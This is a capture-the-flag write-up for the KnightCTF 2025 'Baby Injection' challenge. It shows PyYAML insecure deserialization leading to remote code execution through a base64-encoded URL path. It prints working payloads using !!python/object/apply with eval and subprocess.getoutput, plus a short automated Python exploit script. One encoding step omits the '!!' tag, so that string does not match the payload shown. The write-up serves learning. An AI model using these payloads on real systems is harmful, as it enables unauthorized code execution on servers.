### Challenge Description

### Initial Analysis

The site appears as follows:

![Site Presentation](/images/KnightCTF-2025/Baby-Injection/site_presentation.png "Site Presentation")

The first thing that immediately stands out is the site's URL:

```
http://172.105.121.246:5990/eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE=
```


In fact, that looks like a base64 encoding. Let's try to decode it:

```bash
 echo "eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE=" | base64 -d
```

Decoding it, I got the following:

```yml
yaml: Its yaml bro, hack me if you can!!!
```

So, the decoded base64 seems to be reflected on the page, as we can see from the previous screenshot. It seems that since it mentions YAML, this could be a case of YAML insecure deserialization. In fact, looking at the request header, we can tell that everything is being executed with Python. Since Python has a library called PyYAML, we can exploit the deserialization process to achieve Remote Code Execution (RCE). 

### Exploit
I personally used this payload:

```yml
yaml: !!python/object/apply:eval ["__import__('os').listdir('.')"]
```

But many other payloads could have been used, such as:

```yml
yaml: !!python/object/apply:subprocess.getoutput ["ls -al"]
```
Other payloads can be found on [PayloadsAllTheThings](). So, I simply encoded it in base64:

```bash
echo "yaml: python/object/apply:subprocess.getoutput ['ls -al']" | base64
```

And that's how I formed the URL for injecting the "ls -al" command:

```
http://172.105.121.246:5990/eWFtbDogcHl0aG9uL29iamVjdC9hcHBseTpzdWJwcm9jZXNzLmdldG91dHB1dCBbJ2xzIC1hbCdd
```

By opening the URL, the command was executed on the server, listing the directories, and in doing so, I found the flag:

![Manual Flag](/images/KnightCTF-2025/Baby-Injection/manual_flag.png "Manual Flag")

### Automated Exploit

I also created an automated Python exploit for extracting the flag:

```python
import requests
import base64
import re

url = "http://172.105.121.246:5990/"
payload = '''yaml: !!python/object/apply:eval ["__import__('os').listdir('.')"]'''
print("\nFLAG: " + re.search(r'KCTF{[a-f0-9]+}', requests.get(url + base64.b64encode(payload.encode('utf-8')).decode('utf-8')).text).group(0))
```
